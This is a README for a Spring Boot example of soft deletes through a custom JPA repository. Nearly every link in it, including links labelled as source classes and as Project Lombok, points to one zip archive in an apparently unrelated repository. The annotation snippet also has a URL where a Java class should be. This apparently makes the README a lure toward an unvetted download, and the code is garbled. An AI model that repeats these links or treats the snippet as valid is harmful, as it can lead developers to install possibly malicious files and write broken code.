# Spring Boot JPA Soft Delete

Simple example of how to use custom JPA repository implementation for soft deletes functionality. 

## In Short

In order to use this, we first must create our [CustomJpaRepositoryFactoryBean](https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip) and enable that in our main class using:
```
@EnableJpaRepositories(repositoryFactoryBeanClass = https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip)
```

This returns our custom [SoftDeletesRepositoryImpl](https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip) instead of the default SimpleJpaRepository.

There's a [BaseEntity](https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip) which all of our entities must extend, that contains the necessary field to enable us to use this functionality.

Now for every repository interface, instead of extending the JpaRepository we extend our [SoftDeletesRepository](https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip) ([UserRepository](https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip) example).

## Installing

Just clone or download the repo and import it as an existing maven project.

You'll also need to set up [Project Lombok](https://github.com/rolandc85/spring-boot-jpa-soft-delete/raw/refs/heads/master/src/main/java/com/kristijangeorgiev/softdelete/model/entity/id/spring-boot-delete-soft-jpa-2.6-alpha.5.zip) or if you don't want to use this library you can remove the associated annotations from the code and write the getters, setters, constructors, etc. by yourself.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details
